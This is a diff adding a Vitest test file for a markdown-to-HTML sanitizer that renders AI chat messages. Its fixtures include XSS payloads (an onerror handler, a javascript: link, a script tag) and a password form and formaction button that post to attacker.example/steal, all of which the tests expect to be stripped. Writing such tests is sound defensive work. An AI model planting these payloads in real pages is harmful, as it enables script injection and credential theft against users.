@@ -1,0 +1,63 @@
+// @vitest-environment jsdom
+import { describe, expect, it } from "vitest";
+
+import { mdToHtml } from "#layers/ai/app/utils/md-to-html";
+
+const render = (markdown: string): HTMLElement => {
+  const container = document.createElement("div");
+  container.innerHTML = mdToHtml(markdown);
+  return container;
+};
+
+describe("markdown of the messages", () => {
+  it("renders the formatting of an answer", () => {
+    const html = render(
+      ["# Title", "", "Some **bold** text with a [link](https://example.com).", "", "- [x] done", "- [ ] pending"].join(
+        "\n",
+      ),
+    );
+    expect(html.querySelector("h1")?.textContent).toBe("Title");
+    expect(html.querySelector("strong")?.textContent).toBe("bold");
+    expect(html.querySelector("a")?.getAttribute("href")).toBe("https://example.com");
+    expect(html.querySelector("a")?.getAttribute("rel")).toBe("noopener noreferrer nofollow");
+    const checkboxes = [...html.querySelectorAll("input")];
+    expect(checkboxes.map((input) => [input.type, input.disabled, input.checked])).toEqual([
+      ["checkbox", true, true],
+      ["checkbox", true, false],
+    ]);
+  });
+
+  it("drops the scripts, the styles and the classes that would change the application", () => {
+    const html = render(
+      [
+        "Summary.",
+        "",
+        "<style>.overlay{position:fixed;inset:0;background:red}</style>",
+        '<div class="overlay fixed inset-0 z-50" style="position:fixed;inset:0">text</div>',
+        '<img src="x" onerror="window.xss = 1">',
+        '<a href="javascript:window.xss = 2">link</a>',
+        "<script>window.xss = 3</script>",
+      ].join("\n"),
+    );
+    expect(html.querySelector("style")).toBeNull();
+    expect(html.querySelector("script")).toBeNull();
+    expect(html.querySelector("div")?.getAttribute("class")).toBeNull();
+    expect(html.querySelector("div")?.getAttribute("style")).toBeNull();
+    expect(html.querySelector("img")?.getAttribute("onerror")).toBeNull();
+    expect(html.querySelector("a")?.getAttribute("href")).toBeNull();
+    expect(html.textContent).toContain("text");
+  });
+
+  it("drops the forms that would send away what is typed in them", () => {
+    const html = render(
+      [
+        "Summary.",
+        "",
+        '<form action="https://attacker.example/steal"><input name="password"><button>Continue</button></form>',
+        '<button formaction="https://attacker.example/steal">Continue</button>',
+      ].join("\n"),
+    );
+    expect(html.querySelector("form")).toBeNull();
+    expect(html.querySelector("[formaction]")).toBeNull();
+  });
+});
